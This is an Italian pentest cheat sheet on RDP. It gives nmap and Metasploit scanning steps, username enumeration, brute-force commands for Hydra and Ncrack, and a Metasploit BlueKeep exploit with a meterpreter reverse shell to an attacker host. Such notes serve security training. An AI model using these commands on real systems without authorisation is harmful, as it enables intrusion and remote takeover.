# RDP Enumeration & Exploitation

**RDP (Remote Desktop Protocol)** è un protocollo sviluppato da Microsoft che consente l’accesso remoto a un desktop grafico su macchine Windows. <br>
Opera sulla porta `3389/TCP` che se mal configurato o affetto da vulnerabilità note, può rappresentare un punto di accesso privilegiato per un attaccante.

---

## Fase 1 – Scansione del Servizio RDP

Per verificare la presenza del servizio RDP:
`nmap -p 3389 -sV <IP>`

Per ottenere informazioni aggiuntive tramite NTLM:
`nmap -p 3389 --script rdp-ntlm-info <IP>`

Questo script può restituire:
- Nome del dominio
- Nome macchina
- Versione del sistema operativo

Questi dati possono essere utili anche senza autenticazione.

Se sospetti che RDP sia su una porta non standard, puoi usare Metasploit:
`use auxiliary/scanner/rdp/rdp_scanner`  
`set RHOSTS <IP>`  
`set RPORT <porta_sospetta>`  
`run`  

---

## Fase 2 – Connessione Manuale e Osservazioni

Tentativi di connessione con:
- Linux: `xfreerdp /v:<IP>`
- Kali: `rdesktop <IP>`
- Windows: `mstsc.exe`

Osservazioni da fare:
- Prompt di login
- Banner informativi
- Errori che rivelano dettagli su utenti, domini, o configurazioni

Esempi di messaggi utili:
- “Utente non autorizzato” ⟶ utente esiste ma non ha accesso remoto
- “Username o password errata” ⟶ username valido
- “Nessun dominio specificato” ⟶ server non è parte di un dominio

Una volta ottenute credenziali valide:
`xfreerdp /u:<username> /p:<password> /v:<IP>:<PORT>`  
Durante la connessione potrebbe comparire un avviso sul certificato non verificato: accettare con `YES`.

---

## Fase 3 – Enumerazione Utenti tramite Timing

Alcuni strumenti tentano di identificare utenti validi in base al tempo di risposta del servizio RDP durante una connessione fallita. Tecnica simile all’enumerazione utenti su SSH.

Strumenti utili:
- `rdp-sec-check`
- `Crowbar` (per brute-force RDP)

---

## Fase 4 – Brute-force Credenziali RDP

⚠️ Attenzione: il brute-force su RDP può attivare sistemi di difesa (lockout, log, allarmi).

Con Hydra:
`hydra -t 4 -V -f -l <user> -P <wordlist> rdp://<IP>`

Con Ncrack:
`ncrack -p 3389 -u <user> -P <wordlist> <IP>`

Oppure per brute-force completo:
`hydra -L <pathUsernames> -P <pathPasswords> rdp://<IP> -s <PORT>`  

- `-L` → file con la lista utenti  
- `-P` → file con la lista password  
- `-s` → porta RDP (se diversa da 3389)  
- `-t` → numero massimo di thread (es. `-t 4` per rallentare l'attacco)


---

## Fase 5 – Verifica Vulnerabilità BlueKeep (CVE-2019-0708)

**BlueKeep** è una vulnerabilità critica che permette RCE senza autenticazione sfruttando un buffer overflow nel servizio RDP. Colpisce Windows XP, Server 2003, Windows 7 e Server 2008.

Verifica presenza della porta:
`nmap -p 3389 <IP>`

Verifica vulnerabilità:
- `nmap -p 3389 --script rdp-vuln-ms12-020 <IP>` ⟶ può indicare anomalie
- `nmap -p 3389 --script rdp-vuln-cve2019-0708 <IP>` ⟶ verifica specifica BlueKeep

Con Metasploit:
`use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`  
`set RHOSTS <IP>`  
`run`

Visualizza i target supportati:
`show targets`  
`set target <numero>`

---

## Fase 6 – Exploiting di BlueKeep con Metasploit

Modulo di exploit:
`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`  
`set RHOSTS <IP>`  
`set RPORT 3389`  
`set payload windows/x64/meterpreter/reverse_tcp`  
`set LHOST <KaliIP>`  
`set LPORT <Port>`  
`run`

⚠️ Estremamente instabile: usare solo in ambienti di test.

---

## Fase 7 – Listener Metasploit

Per ricevere la reverse shell:
`use multi/handler`  
`set payload windows/x64/meterpreter/reverse_tcp`  
`set LHOST <KaliIP>`  
`set LPORT <Port>`  
`run`

---
